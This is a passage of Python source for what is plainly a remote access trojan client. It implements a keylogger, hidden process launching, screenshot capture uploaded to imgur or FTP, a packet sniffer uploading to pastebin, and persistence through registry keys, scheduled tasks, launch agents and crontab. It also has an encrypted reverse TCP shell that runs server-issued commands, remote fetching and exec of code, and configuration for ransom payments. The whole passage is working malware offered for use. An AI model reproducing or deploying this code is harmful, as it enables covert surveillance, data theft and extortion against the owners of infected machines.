    @config(platforms=['win32','linux2','darwin'], command=True, usage='evaluate <code>')
    def evaluate(self, code):
        """
        evaluate code in current context and return output
        """
        try:
            return eval(code)
        except Exception as e:
            return "eval('{}') failed with error: {}".format(str(code), str(e))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='execute <path>')
    def execute(self, path):
        """
        execute a program in a hidden process
        """
        if os.path.isfile(path):
            name = os.path.splitext(os.path.basename(path))[0]
            try:
                info = subprocess.STARTUPINFO()
                info.dwFlags = subprocess.STARTF_USESHOWWINDOW | subprocess.CREATE_NEW_PROCESS_GROUP
                info.wShowWindow = subprocess.SW_HIDE
                p = subprocess.Popen(path, startupinfo=info)
                self._jobs[name] = self.hidden_process(p)
                return "Launched '{}' in a hidden process".format(name)
            except Exception as e:
                try:
                    self._jobs[name] = subprocess.Popen(path, 0, None, None, subprocess.PIPE, subprocess.PIPE)
                    return "Launched '{}' in as a new process".format(name)
                except Exception as e:
                    return "{} returned error: {}".format(self.execute.func_name, str(e))
        else:
            return "File '{}' not found".format(str(path))


    @config(platforms=['win32','linux2','darwin'], max_bytes=4000, buffer=cStringIO.StringIO(), window=None, command=True, usage='keylogger <start/stop>')
    def keylogger(self, mode=None):
        """
        start/stop the keylogger
        """
        if not mode:
            if self.keylogger.func_name not in self._jobs:
                return self.keylogger.usage
            else:
                return self._get_status(self._jobs[self.keylogger.func_name].name)

        elif mode and str(mode) == 'start':
            if self.keylogger.func_name not in self._jobs:
                self._jobs[self.keylogger.func_name] = threading.Thread(target=self._keylogger, name=time.time())
                self._jobs[self.keylogger.func_name].setDaemon(True)
                self._jobs[self.keylogger.func_name].start()
                self._jobs[self._keylogger_manager.func_name.strip('_')] = threading.Thread(target=self._keylogger_manager, name=time.time())
                self._jobs[self._keylogger_manager.func_name.strip('_')].setDaemon(True)
                self._jobs[self._keylogger_manager.func_name.strip('_')].start()
                return "Keylogger running"
            else:
                t1 = float(time.time()) - float(self._jobs[self.keylogger_func_name].name)
                t2 = float(time.time()) - float(self._jobs[self._keylogger_manager.func_name.strip('_')].name)
                return "Keylogger running: {}".format(max(t1, t2))
        elif mode and str(mode) == 'stop':
            if self.keylogger.func_name in self._jobs:
                for job in self._jobs:
                    if 'keylogger' in job:
                         _ = self._jobs.pop(self.keylogger.func_name, None)
                         del _
            return "Keylogger stopped"


    @config(platforms=['win32','linux2','darwin'], command=True, usage='screenshot [mode]')
    def screenshot(self, *args):
        """
        capture a screenshot from host device
        """
        try:
            with mss.mss() as screen:
                img = screen.grab(screen.monitors[0])
            png     = self._get_png(img)
            result  = self._upload_imgur(png) if 'ftp' not in args else self._upload_ftp(png, filetype='.png')
            return result
        except Exception as e:
            return "{} returned error: '{}'".format(self.screenshot.func_name, str(e))


    @config(platforms=['win32','linux2','darwin'], methods={method: {'established': bool(), 'result': bytes()} for method in ['hidden_file','scheduled_task','registry_key','startup_file','launch_agent','crontab_job']}, command=True, usage='persistence <args>')
    def persistence(self, args=None):
        """
        establish persistence to survive reboots
        """
        try:
            if not args:
                for method in [_ for _ in self.persistence.methods if not self.persistence.methods[_]['established']]:
                    target = '_persistence_add_{}'.format(method)
                    if sys.platform in getattr(self, target).platforms:
                        established, result = getattr(self, target)()
                        self.persistence.methods[method]['established'] = established
                        self.persistence.methods[method]['result'] = result
                    else:
                        self.persistence.methods[method]['established'] = False
                        self.persistence.methods[method]['result'] = "Persistence method '{}' is not compatible with {}".format(method, sys.platform)
                return json.dumps(self.persistence.methods, indent=2)
            else:
                cmd, _, method = str(args).partition(' ')
                method = method.replace(' ','_') if ' ' in method else method
                if 'method' in cmd:
                    return json.dumps(self.persistence.methods)
                elif not method or cmd not in ('add','remove') or method not in self.persistence.methods:
                    return self.persistence.usage
                elif self.persistence.methods[method].get('established'):
                    return json.dumps(self.persistence.methods[method])
                else:
                    target = '_persistence_{}_{}'.format(cmd, method)
                    if sys.platform in getattr(self, target).platforms:
                        established, result = getattr(self, target)()
                        self.persistence.methods[method]['established'] = established
                        self.persistence.methods[method]['result'] = result
                    else:
                        self.persistence.methods[method]['established'] = False
                        self.persistence.methods[method]['result'] = "Persistence method '{}' is not compatible with {}".format(method, sys.platform)
                    return json.dumps(self.persistence.methods[method])
        except Exception as e:
            return "{} returned error: '{}'".format(self.persistence.func_name, str(e))


    @config(platforms=['linux2','darwin'], command=True, usage='packetsniffer [mode]')
    def packetsniffer(self, *args):
        """
        sniff local network and capture packets
        """
        def sniffer(self, seconds, *args):
            limit = time.time() + seconds
            sniffer_socket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            while time.time() < limit:
                try:
                    recv_data = sniffer_socket.recv(2048)
                    recv_data, ip_bool = self._packetsniffer_eth_header(recv_data)
                    if ip_bool:
                        recv_data, ip_proto = self._packetsniffer_ip_header(recv_data)
                        if ip_proto == 6:
                            recv_data = self._packetsniffer_tcp_header(recv_data)
                        elif ip_proto == 17:
                            recv_data = self._packetsniffer_udp_header(recv_data)
                except: break
            sniffer_socket.close()
            try:
                output = cStringIO.StringIO('\n'.join(self.packetsniffer.capture))
                result = self._upload_pastebin(output) if 'ftp' not in args else self._upload_ftp(output, filetype='.pcap')
            except Exception as e:
                self.debug("packetsniffer manager returned error: {}".format(str(e)))
        try:
            duration = 300.0 if not len([i for i in args if str(i).isdigit()]) else int([i for i in args if str(i).isdigit()][0])
            if self.packetsniffer.func_name in self._jobs:
                return "packetsniffer running for {}".format(self._get_status(self._jobs[self.packetsniffer.func_name].name))
            if not str(duration).isdigit():
                return "packetsniffer argument 'duration' must be integer"
            duration = int(duration)
            self._jobs[self.packetsniffer.func_name] = threading.Thread(target=sniffer, args=(self, duration), name=time.time())
            self._jobs[self.packetsniffer.func_name].start()
            return 'Capturing network traffic for {} seconds'.format(duration)
        except Exception as e:
            return "{} returned error: '{}'".format(self.packetsniffer.func_name, str(e))


    def connect(self, *args, **kwargs):
        """
        create secure connection with server and start new session 
        """
        self.kill()
        port = 1337 if 'port' not in kwargs else int(kwargs.get('port'))
        self._session['socket']      = self._get_connection(kwargs.get('host'), int(port)) if bool('host' in kwargs and self._is_ipv4_address(kwargs.get('host'))) else self._get_connection(self._server(), int(port))
        self._session['connection'].set()
        self._session['key']         = self._diffiehellman()
        self._session['id']          = self._session_id()
        self._session['public_key']  = self._public_key()
        self._session['socket'].setblocking(True)


    def reverse_tcp_shell(self):
        """
        send encrypted shell back to server via outgoing TCP connection
        """
        while True:
            if self._session['connection'].wait(timeout=3.0):
                self._send(**{"id": "0" * 64, "session_id": self._session["id"], "client_id": self._info["id"], "task": "prompt", "data": "[{} @ %s]> " % os.getcwd()})
                task   = self._recv()
                result = ""
                if task:
                    command, _, action  = bytes(task['task']).partition(' ')
                    if command in self._commands:
                        try:
                            result  = bytes(self._commands[command]['method'](action)) if len(action) else bytes(self._commands[command]['method']())
                        except Exception as e1:
                            result  = "Error: %s" % bytes(e1)
                    else:
                        try:
                            result  = bytes().join(subprocess.Popen(command, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
                        except Exception as e2:
                            result  = "Error: %s" % bytes(e2)

                if result and result != "None":
                    task.update({"data": result})
                    self._results[time.ctime()] = task
                    self._send(**task)
                for name, worker in self._jobs.items():
                    if not worker.is_alive():
                        _ = self._jobs.pop(name, None)
                        del _
                time.sleep(0.3)
        _ = self._jobs.pop(self.reverse_tcp_shell.func_name, None)
        del _
        self.kill()
        time.sleep(5)
        return self.run()


    @staticmethod
    def debug(data):
        """
        prints client output if debugging is enabled
        """
        if Client._debug:
            with Client._lock:
                print(bytes(data))


    def run(self, *args, **kwargs):
        """
        find active server + request connection +  transactionless key agreement + encrypted reverse shell
        """
        self._session['connection'] = threading.Event()
        self.connect(*args, **kwargs)
        self._jobs[self.reverse_tcp_shell.func_name] = threading.Thread(target=self.reverse_tcp_shell, name=time.time())
        self._jobs[self.reverse_tcp_shell.func_name].start()




def main(*args, **kwargs):
    try:
        if 'v' in kwargs or '--debug' in sys.argv:
            Client._debug   = True
            Client.debug("\nDebugging mode enabled\n")
        if 'f' not in kwargs and '__file__' in globals():
            kwargs['f'] = bytes_to_long(globals()['__file__'])            
        if 'w' in kwargs:
            exec "import urllib" in globals()
            w = kwargs.get('w')
            imports     = Client._get_config(w)
            exec imports in globals()           
        if 'd' in kwargs:
            d = kwargs.get('d')
            imgur_api_key= Client._get_config(d)
            Client._configure('_upload_imgur', api_key=imgur_api_key)
        if 'c' in kwargs:
            c = kwargs.get('c')
            pastebin_api_key, pastebin_user_key = Client._get_config(c).splitlines()
            Client._configure('_upload_pastebin', api_dev_key=pastebin_api_key, api_User_key=pastebin_user_key)            
        if 'q' in kwargs:
            q = kwargs.get('q')
            ftp_host, ftp_user, ftp_passwd  = Client._get_config(q).splitlines()
            Client._configure('_upload_ftp', hostname=ftp_host, username=ftp_user, password=ftp_passwd)
        if 'p' in kwargs:
            p = kwargs.get('p')
            ransom_accont_id, ransom_client_id, ransom_client_secret  = Client._get_config(p).splitlines()
            Client._configure('_ransom_payment', account_id=ransom_account_id, client_id=ransom_client_id, client_secret=ransom_client_secret)
    finally:
        payload = Client(**kwargs)
        payload.run() if not Client._debug else payload.run(host='127.0.0.1', port=1337)
        return payload


if __name__ == '__main__':
    m = main(**{
  "a": "77805891333617111642",
  "b": "81266016987952607600",
  "c": "78671681703351507562",
  "d": "79030013784106676584",
  "g": "79328323225122003561",
  "j": "76650156158318301560",
  "l": "81040047328712224353",
  "o": "80180089838536317512",
  "p": "80692935077109257793",
  "q": "80324520337976078676",
  "r": "81126388790932157784",
  "s": "81340939681778199109",
  "t": "79310384705633414777",
  "u": "76299683425183950643",
  "w": "77888090548015223857",
  "z": "79892739118577505130"
})

